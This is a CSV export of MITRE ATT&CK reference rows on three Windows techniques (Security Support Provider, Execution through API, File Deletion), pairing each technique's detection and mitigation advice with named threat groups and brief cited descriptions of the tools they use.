1067,['Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]'],[],[],[],"['DLL monitoring', 'Windows Registry', 'Loaded DLLs']",['The [[Software/S0002|Mimikatz]] credential dumper contains an implementation of an SSP.[[CiteRef::Deply Mimikatz]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Persistence'],['Technique/T1101'],['Security Support Provider'],https://attack.mitre.org/wiki/Technique/T1101
1068,['Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]'],[],[],[],"['DLL monitoring', 'Windows Registry', 'Loaded DLLs']",['The [[Software/S0002|Mimikatz]] credential dumper contains an implementation of an SSP.[[CiteRef::Deply Mimikatz]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Persistence'],['Technique/T1101'],['Security Support Provider'],https://attack.mitre.org/wiki/Technique/T1101
1069,['Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]'],[],[],[],"['DLL monitoring', 'Windows Registry', 'Loaded DLLs']",['The [[Software/S0002|Mimikatz]] credential dumper contains an implementation of an SSP.[[CiteRef::Deply Mimikatz]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Persistence'],['Technique/T1101'],['Security Support Provider'],https://attack.mitre.org/wiki/Technique/T1101
1070,['Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]'],[],[],[],"['DLL monitoring', 'Windows Registry', 'Loaded DLLs']",['The [[Software/S0002|Mimikatz]] credential dumper contains an implementation of an SSP.[[CiteRef::Deply Mimikatz]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Persistence'],['Technique/T1101'],['Security Support Provider'],https://attack.mitre.org/wiki/Technique/T1101
1071,['Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]'],[],[],[],"['DLL monitoring', 'Windows Registry', 'Loaded DLLs']",['The [[Software/S0002|Mimikatz]] credential dumper contains an implementation of an SSP.[[CiteRef::Deply Mimikatz]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Persistence'],['Technique/T1101'],['Security Support Provider'],https://attack.mitre.org/wiki/Technique/T1101
1072,['Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]'],[],[],[],"['DLL monitoring', 'Windows Registry', 'Loaded DLLs']",['The [[Software/S0002|Mimikatz]] credential dumper contains an implementation of an SSP.[[CiteRef::Deply Mimikatz]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Persistence'],['Technique/T1101'],['Security Support Provider'],https://attack.mitre.org/wiki/Technique/T1101
1073,"['Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows API functions such as CreateProcess are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient.']",[],[],['Stefan Kanthak'],"['API monitoring', 'Process monitoring']",['[[Software/S0128|BADNEWS]] has a command to download an .exe and execute it via CreateProcess API.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior. Audit and/or block potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: BADNEWS,['Execution'],['Technique/T1106'],['Execution through API'],https://attack.mitre.org/wiki/Technique/T1106
1074,"['Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows API functions such as CreateProcess are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient.']",[],[],['Stefan Kanthak'],"['API monitoring', 'Process monitoring']",['[[Software/S0045|ADVSTORESHELL]] is capable of starting a process using CreateProcess.[[CiteRef::Bitdefender APT28 Dec 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior. Audit and/or block potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: ADVSTORESHELL, NETUI, ...",['Execution'],['Technique/T1106'],['Execution through API'],https://attack.mitre.org/wiki/Technique/T1106
1075,"['Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows API functions such as CreateProcess are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient.']",[],[],['Stefan Kanthak'],"['API monitoring', 'Process monitoring']",['[[Software/S0161|XAgentOSX]] contains the execFile function to execute a specified file on the system using the NSTask:launch method.[[CiteRef::XAgentOSX]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior. Audit and/or block potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: XAgentOSX,['Execution'],['Technique/T1106'],['Execution through API'],https://attack.mitre.org/wiki/Technique/T1106
1076,"['Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows API functions such as CreateProcess are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient.']",[],[],['Stefan Kanthak'],"['API monitoring', 'Process monitoring']",['[[Software/S0013|PlugX]] can use the Windows API function CreateProcess to execute another process.[[CiteRef::Lastline PlugX Analysis]]'],['DragonOK'],['DragonOK'],['G0017'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior. Audit and/or block potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PlugX, Sogu, Kaba",['Execution'],['Technique/T1106'],['Execution through API'],https://attack.mitre.org/wiki/Technique/T1106
1077,"['Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows API functions such as CreateProcess are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient.']",[],[],['Stefan Kanthak'],"['API monitoring', 'Process monitoring']","['[[Software/S0154|Cobalt Strike]]\'s ""beacon"" payload is capable of running shell commands without <code>cmd.exe</code> and PowerShell commands without <code>powershell.exe</code>[[CiteRef::cobaltstrike manual]]']",['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior. Audit and/or block potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: Cobalt Strike,['Execution'],['Technique/T1106'],['Execution through API'],https://attack.mitre.org/wiki/Technique/T1106
1078,"['Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows API functions such as CreateProcess are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient.']",[],[],['Stefan Kanthak'],"['API monitoring', 'Process monitoring']",['[[Software/S0013|PlugX]] can use the Windows API function CreateProcess to execute another process.[[CiteRef::Lastline PlugX Analysis]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior. Audit and/or block potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PlugX, Sogu, Kaba",['Execution'],['Technique/T1106'],['Execution through API'],https://attack.mitre.org/wiki/Technique/T1106
1079,"['Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows API functions such as CreateProcess are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient.']",[],[],['Stefan Kanthak'],"['API monitoring', 'Process monitoring']",['[[Software/S0013|PlugX]] can use the Windows API function CreateProcess to execute another process.[[CiteRef::Lastline PlugX Analysis]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior. Audit and/or block potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PlugX, Sogu, Kaba",['Execution'],['Technique/T1106'],['Execution through API'],https://attack.mitre.org/wiki/Technique/T1106
1080,"['Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows API functions such as CreateProcess are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient.']",[],[],['Stefan Kanthak'],"['API monitoring', 'Process monitoring']",['[[Software/S0013|PlugX]] can use the Windows API function CreateProcess to execute another process.[[CiteRef::Lastline PlugX Analysis]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior. Audit and/or block potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PlugX, Sogu, Kaba",['Execution'],['Technique/T1106'],['Execution through API'],https://attack.mitre.org/wiki/Technique/T1106
1081,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']","[""[[Software/S0067|pngdowner]] deletes content from C2 communications that was saved to the user's temporary directory.[[CiteRef::CrowdStrike Putter Panda]]""]",['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: pngdowner,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1082,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['Malware used by [[Group/G0043|Group5]] is capable of remotely deleting files from victims.[[CiteRef::Citizen Lab Group5]]'],['Group5'],['Group5'],['G0043'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],[],['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1083,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0032|gh0st]] RAT is able to delete files.[[CiteRef::FireEye Hacking Team]]'],['PittyTiger'],['PittyTiger'],['G0011'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: gh0st,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1084,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['Some [[Software/S0074|Sakula]] samples use cmd.exe to delete temporary files.[[CiteRef::Dell Sakula]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: Sakula, Sakurel, VIPER",['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1085,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0021|Derusbi]] is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.[[CiteRef::Fidelis Turbo]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: Derusbi,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1086,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0151|HALFBAKED]] can delete a specified file.[[CiteRef::FireEye FIN7 April 2017]]'],['FIN7'],['FIN7'],['G0046'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: HALFBAKED,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
